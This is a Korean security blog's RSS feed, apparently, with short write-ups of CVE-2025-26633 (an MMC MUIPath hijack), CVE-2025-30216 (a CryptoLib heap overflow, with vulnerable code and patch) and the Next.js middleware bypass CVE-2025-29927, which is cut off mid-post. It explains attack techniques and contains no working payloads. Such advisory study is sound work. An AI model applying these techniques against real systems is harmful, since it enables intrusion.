<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 02 Apr 2025 01:32:39 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-26633: Microsoft Management Console(MMC)의 MUIPath 경로를 통한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/02/ogu123/cve-2025-26633/</link>
      <guid>https://hackyboiz.github.io/2025/04/02/ogu123/cve-2025-26633/</guid>
      <pubDate>Wed, 02 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.trendmicro.com/en_us/research/25/c/cve-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.trendmicro.com/en_us/research/25/c/cve-2025-26633-water-gamayun.html">https://www.trendmicro.com/en_us/research/25/c/cve-2025-26633-water-gamayun.html</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xC9C0;&#xC6D0;&#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xBC84;&#xC804;&#xC758; Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB7EC;&#xC2DC;&#xC544; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xADF8;&#xB8F9; Water Gamayun(EncryptHub, Larva-208&#xB85C;&#xB3C4; &#xBD88;&#xB9BC;)&#xC774; MMC(Microsoft Management Console)&#xC758; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;(CVE-2025-26633)&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xBC0F; &#xB370;&#xC774;&#xD130; &#xD0C8;&#xCDE8;&#xC744; &#xC218;&#xD589;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBC1D;&#xD600;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/02/ogu123/cve-2025-26633/1.png" alt></p><p>MMC&#xB294; Windows&#xC758; &#xAC01;&#xC885; &#xC124;&#xC815;(&#xC7A5;&#xCE58; &#xAD00;&#xB9AC;&#xC790;, &#xC791;&#xC5C5; &#xC2A4;&#xCF00;&#xC904;&#xB7EC; &#xB4F1;)&#xC744; &#xD55C;&#xACF3;&#xC5D0;&#xC11C; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xACE0; &#xC5EC;&#xB7EC; &#xC124;&#xC815;&#xC744;  .msc &#xD30C;&#xC77C;&#xB85C; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; .msc &#xD30C;&#xC77C;&#xACFC; MUIPath(Multilingual User Interface Path)&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/02/ogu123/cve-2025-26633/2.png" alt></p><p>MMC&#xAC00; .msc &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>ScOnOpenDocument</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p><p><code>ScOnOpenDocument</code>&#xB294; <code>ScGetMuiPath</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; MUIPath(en-US) &#xD3F4;&#xB354;&#xC5D0; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; .msc &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D; MUIPath(en-US) &#xD3F4;&#xB354;&#xC5D0; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC758; .msc &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA74;, &#xC6D0;&#xBCF8; .msc &#xD30C;&#xC77C; &#xB300;&#xC2E0; MUIPath(en-US) &#xD3F4;&#xB354;&#xC758; .msc&#xB97C; &#xC6B0;&#xC120; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; &#xC545;&#xC131; .msc&#xB97C; en-US &#xD3F4;&#xB354;&#xC5D0; &#xB123;&#xC5B4;&#xC73C;&#xB85C;&#xC368; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/02/ogu123/cve-2025-26633/3.png" alt></p><p><img src="/2025/04/02/ogu123/cve-2025-26633/4.png" alt></p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; MMC&#xC758; ActiveX &#xCEE8;&#xD2B8;&#xB864; &#xC2A4;&#xB0C5;&#xC778; &#xB0B4;&#xC5D0;&#xC11C; ExecuteShellCommand &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.securityweek.com/russian-ransomware-gang-exploited-windows-zero-day-before-patch/">https://www.securityweek.com/russian-ransomware-gang-exploited-windows-zero-day-before-patch/</a></li><li><a href="https://www.ncsc.go.kr:4018/main/cop/bbs/selectBoardArticle.do?bbsId=Notification_main&amp;nttId=202421&amp;pageIndex=1&amp;searchCnd2=">https://www.ncsc.go.kr:4018/main/cop/bbs/selectBoardArticle.do?bbsId=Notification_main&amp;nttId=202421&amp;pageIndex=1&amp;searchCnd2=</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/MMC/">MMC</category>
      
      <category domain="https://hackyboiz.github.io/tags/MUI/">MUI</category>
      
      <category domain="https://hackyboiz.github.io/tags/Water-Gamayun/">Water Gamayun</category>
      
      <category domain="https://hackyboiz.github.io/tags/EncryptHub/">EncryptHub</category>
      
      <category domain="https://hackyboiz.github.io/tags/Larva-208/">Larva-208</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/02/ogu123/cve-2025-26633/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-30216: CryptoLib의 Heap Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/</link>
      <guid>https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/</guid>
      <pubDate>Sat, 29 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/nasa/CryptoLib/security/advis</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://github.com/nasa/CryptoLib/security/advisories/GHSA-v3jc-5j74-hcjv">https://github.com/nasa/CryptoLib/security/advisories/GHSA-v3jc-5j74-hcjv</a></p></li><li><p><a href="https://securityonline.info/cryptolib-vulnerability-heap-overflow-threatens-space-communications/">https://securityonline.info/cryptolib-vulnerability-heap-overflow-threatens-space-communications/</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CryptoLib &lt;= 1.3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD56D;&#xACF5;&#xC6B0;&#xC8FC; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; NASA&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC778; CryptoLib&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810; CVE-2025-30216&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; CryptoLib&#xC774; TM &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD328;&#xD0B7;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>src/core/crypto_tm.c</code> &#xC758; <code>Crypto_TM_ProcessSecurity()</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><blockquote><p>TM &#xD504;&#xB85C;&#xD1A0;&#xCF5C;(Telemetry Space Data Link Protocol) &#xC740; &#xC6B0;&#xC8FC;&#xC120;&#xACFC; &#xC9C0;&#xC0C1;&#xAD6D; &#xAC04; &#xD1B5;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <strong>CCSDS(Cosultative Committee for Space Data Systems) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;</strong>&#xC758; &#xD558;&#xC704; &#xB370;&#xC774;&#xD130;&#xB9C1;&#xD06C; &#xACC4;&#xCE35; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C;, &#xB2E8;&#xC77C; &#xC6B0;&#xC8FC; &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD568;.</p></blockquote><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int32_t</span> <span class="hljs-title">Crypto_TM_ProcessSecurity</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> *p_ingest, <span class="hljs-keyword">uint16_t</span> len_ingest, <span class="hljs-keyword">uint8_t</span> **pp_processed_frame,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">uint16_t</span> *p_decrypted_length)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//...</span>status = Crypto_TM_Process_Setup(len_ingest, &amp;byte_idx, p_ingest, &amp;secondary_hdr_len);<span class="hljs-comment">//...</span><span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS){    <span class="hljs-comment">// Allocate buffer</span>  p_new_dec_frame = (<span class="hljs-keyword">uint8_t</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, (len_ingest) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint8_t</span>));<span class="hljs-comment">//..</span>}<span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS){<span class="hljs-comment">// Copy over TM Primary Header (6 bytes),Secondary (if present)</span>    <span class="hljs-comment">// If present, the TF Secondary Header will follow the TF PriHdr</span>    <span class="hljs-built_in">memcpy</span>(p_new_dec_frame, &amp;p_ingest[<span class="hljs-number">0</span>], <span class="hljs-number">6</span> + secondary_hdr_len);<span class="hljs-comment">//..</span>}</code></pre><blockquote><p><a href="https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1824">https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1824</a></p></blockquote><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; TM &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD328;&#xD0B7; &#xD30C;&#xC2F1; &#xC2DC; &#xCD1D; &#xD328;&#xD0B7; &#xAE38;&#xC774;&#xC778; <code>len_ingest</code> &#xB9CC;&#xD07C;&#xC758; &#xD799; &#xBC84;&#xD37C; <code>p_new_dec_frame</code> &#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xD6C4; &#xD328;&#xD0B7; &#xB370;&#xC774;&#xD130;&#xB97C; <code>p_new_dec_frame</code> &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xBCF5;&#xC0AC;&#xD560; &#xD06C;&#xAE30;&#xB294; 6 bytes&#xB85C; &#xACE0;&#xC815;&#xB41C; TM Primary Header&#xC640; &#xAC00;&#xBCC0; &#xD06C;&#xAE30;&#xC778; TF Secondary Header&#xB97C; &#xB354;&#xD574; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xAC00; <code>p_new_dec_frame</code> &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; Heap Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>TF Secondary Header &#xD06C;&#xAE30;&#xC778; <code>secondary_hdr_len</code>&#xC740; <code>Crypto_TM_Process_Setup()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xACB0;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int32_t</span> <span class="hljs-title">Crypto_TM_Process_Setup</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> len_ingest, <span class="hljs-keyword">uint16_t</span> *byte_idx, <span class="hljs-keyword">uint8_t</span> *p_ingest, <span class="hljs-keyword">uint8_t</span> *secondary_hdr_len)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// ...</span>  <span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS)  {      <span class="hljs-comment">// Secondary Header flag is 1st bit of 5th byte (index 4)</span>      *byte_idx = <span class="hljs-number">4</span>;      <span class="hljs-keyword">if</span> ((p_ingest[*byte_idx] &amp; <span class="hljs-number">0x80</span>) == <span class="hljs-number">0x80</span>)      {<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>          <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;A TM Secondary Header flag is set!\n&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>          <span class="hljs-comment">// Secondary header is present</span>          *byte_idx = <span class="hljs-number">6</span>;          <span class="hljs-comment">// Determine length of secondary header</span>          <span class="hljs-comment">// Length coded as total length of secondary header - 1</span>          <span class="hljs-comment">// Reference CCSDS 132.0-B-2 4.1.3.2.3</span>          *secondary_hdr_len = (p_ingest[*byte_idx] &amp; <span class="hljs-number">0x3F</span>) + <span class="hljs-number">1</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>          <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;Secondary Header Length is decoded as: %d\n&quot;</span>, *secondary_hdr_len);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>          <span class="hljs-comment">// Increment from current byte (1st byte of secondary header),</span>          <span class="hljs-comment">// to where the SPI would start</span>          *byte_idx += *secondary_hdr_len;      }      <span class="hljs-keyword">else</span>      {          <span class="hljs-comment">// No Secondary header, carry on as usual and increment to SPI start</span>          *byte_idx = <span class="hljs-number">6</span>;      }  }</code></pre><blockquote><p><a href="https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1262">https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1262</a></p></blockquote><p><code>secondary_hdr_len</code>&#xC740; <code>(p_ingest[*byte_idx] &amp; 0x3F) + 1;</code> &#xACC4;&#xC0B0;&#xC2DD;&#xC744; &#xD1B5;&#xD574; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xB97C; 0x3F+1 (64 bytes) &#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xD558;&#xC9C0;&#xB9CC;, &#xC5EC;&#xC804;&#xD788; <code>len_ingest</code> &#xC640; &#xAD00;&#xB828;&#xB41C; &#xAC80;&#xC0AC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; <code>len_ingest</code>&#xAC00; <code>6 + secondary_hdr_len</code> &#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xACBD;&#xC6B0; &#xBCF5;&#xC0AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>p_new_dec_frame</code> &#xBC84;&#xD37C;&#xC5D0;&#xC11C; buffer overflow&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC545;&#xC6A9;&#xB420; &#xACBD;&#xC6B0; Denial of Service &#xACF5;&#xACA9;&#xC744; &#xD1B5;&#xD574; &#xC6B0;&#xC8FC;&#xC120;&#xACFC; &#xC9C0;&#xC0C1;&#xAD6D; &#xAC04; &#xD1B5;&#xC2E0; &#xC7A5;&#xC560;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xAC70;&#xB098;, RCE exploit&#xC744; &#xD1B5;&#xD574; &#xD328;&#xD0B7;&#xC744; &#xC218;&#xC2E0;&#xD55C; &#xC6B0;&#xC8FC;&#xC120; &#xB610;&#xB294; &#xC9C0;&#xC0C1;&#xAD6D; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">    <span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS)    {        <span class="hljs-comment">// Secondary Header flag is 1st bit of 5th byte (index 4)</span>        *byte_idx = <span class="hljs-number">4</span>;        <span class="hljs-keyword">if</span> ((p_ingest[*byte_idx] &amp; <span class="hljs-number">0x80</span>) == <span class="hljs-number">0x80</span>)        {<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>            <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;A TM Secondary Header flag is set!\n&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>            <span class="hljs-comment">// Secondary header is present</span>            *byte_idx = <span class="hljs-number">6</span>;            <span class="hljs-comment">// Determine length of secondary header</span>            <span class="hljs-comment">// Length coded as total length of secondary header - 1</span>            <span class="hljs-comment">// Reference CCSDS 132.0-B-2 4.1.3.2.3</span>            *secondary_hdr_len = (p_ingest[*byte_idx] &amp; <span class="hljs-number">0x3F</span>) + <span class="hljs-number">1</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>            <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;Secondary Header Length is decoded as: %d\n&quot;</span>, *secondary_hdr_len);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>            <span class="hljs-comment">// We have a secondary header length now, is it sane?</span>            <span class="hljs-comment">// Does it violate spec maximum?</span>            <span class="hljs-comment">// Reference CCSDS 1320b3 4.1.3.1.3</span>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add a test</span>            <span class="hljs-keyword">if</span> (*secondary_hdr_len &gt; TM_SECONDARY_HDR_MAX_VALUE)            {                status = CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE;                mc_if-&gt;mc_log(status);                <span class="hljs-keyword">return</span> status;            }            <span class="hljs-comment">// Does it &apos;fit&apos; in the overall frame correctly?</span>            <span class="hljs-comment">// We can&apos;t validate it down to the byte yet,</span>            <span class="hljs-comment">// we don&apos;t know the variable lengths from the SA yet</span>            <span class="hljs-comment">// Protects from overruns on very short max frame sizes</span>            <span class="hljs-comment">// Smallest frame here is Header | Secondary Header | SPI | 1 byte data</span>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add a test</span>            <span class="hljs-keyword">if</span> (len_ingest &lt; (*byte_idx + *secondary_hdr_len + SPI_LEN + <span class="hljs-number">1</span>))            {                status = CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE;                mc_if-&gt;mc_log(status);                <span class="hljs-keyword">return</span> status;            }            <span class="hljs-comment">// Increment from current byte (1st byte of secondary header),</span>            <span class="hljs-comment">// to where the SPI would start</span>            *byte_idx += *secondary_hdr_len;@@ <span class="hljs-number">-1286</span>,<span class="hljs-number">6</span> +<span class="hljs-number">1309</span>,<span class="hljs-number">7</span> @@            <span class="hljs-comment">// No Secondary header, carry on as usual and increment to SPI start</span>            *byte_idx = <span class="hljs-number">6</span>;        }    }</code></pre><blockquote><p><a href="https://github.com/nasa/CryptoLib/commit/4328a713c4a405a3271cf115e8e7bebfeeba3b95?diff=split">https://github.com/nasa/CryptoLib/commit/4328a713c4a405a3271cf115e8e7bebfeeba3b95?diff=split</a></p></blockquote><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; <code>len_ingest &lt; (*byte_idx + *secondary_hdr_len + SPI_LEN + 1)</code> &#xC870;&#xAC74;&#xC2DD;&#xC744; &#xCD94;&#xAC00;&#xD574; <code>len_ingest</code>&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; <code>CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE</code> &#xC5D0;&#xB7EC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/cryptolib/">cryptolib</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap-buffer-overflow/">heap_buffer_overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/nasa/">nasa</category>
      
      <category domain="https://hackyboiz.github.io/tags/CCSDS-Protocol/">CCSDS_Protocol</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-29927: Next.js 미들웨어 기반 인증 우회 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/27/bekim/2025-03-27/</link>
      <guid>https://hackyboiz.github.io/2025/03/27/bekim/2025-03-27/</guid>
      <pubDate>Thu, 27 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-29927&quot;&gt;https://</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29927">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Next.js 15.x &lt; 15.2.3</li><li>Next.js 14.x &lt; 14.2.25</li><li>Next.js 13.x &lt; 13.5.9</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Next.js &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC758; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xBCF4;&#xD638;&#xB41C; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Next.js&#xC5D0;&#xC11C; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xD398;&#xC774;&#xC9C0;&#xB098; API &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC138;&#xC158; &#xCFE0;&#xD0A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xC778;&#xC99D; &#xBC0F; &#xAD8C;&#xD55C; &#xC5EC;&#xBD80;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>/dashboard/admin</code>&#xCC98;&#xB7FC; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD560; &#xACBD;&#xC6B0;, &#xC138;&#xC158;&#xC774; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74; &#xC694;&#xCCAD;&#xC740; &#xB85C;&#xADF8;&#xC778; &#xD398;&#xC774;&#xC9C0;&#xB85C; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xB429;&#xB2C8;&#xB2E4;.</p><p><a href="https://nextjs.org/docs/messages/middleware-upgrade-guide">Next.js 12.2 &#xC774;&#xC804; &#xBC84;&#xC804;</a>&#xC5D0;&#xC11C;&#xB294; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xD30C;&#xC77C;&#xC758; &#xAD6C;&#xC870;&#xC640; &#xC704;&#xCE58;&#xAC00; &#xACE0;&#xC815;&#xB418;&#xC5B4;&#xC788;&#xB2E4;&#xB294; &#xC810; &#xB54C;&#xBB38;&#xC5D0; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC758; &#xC815;&#xD655;&#xD55C; &#xC704;&#xCE58;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xC26C;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0;&#xB294; &#xD30C;&#xC77C;&#xBA85;&#xC744; _middleware.ts&#xB85C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD588;&#xACE0;, App Router&#xAC00; &#xB3C4;&#xC785;&#xB418;&#xAE30; &#xC804;&#xC774;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; pages/ &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD558;&#xC704;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC804;&#xC5ED; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; pages/_middleware.ts&#xC5D0; &#xC704;&#xCE58;&#xD560; 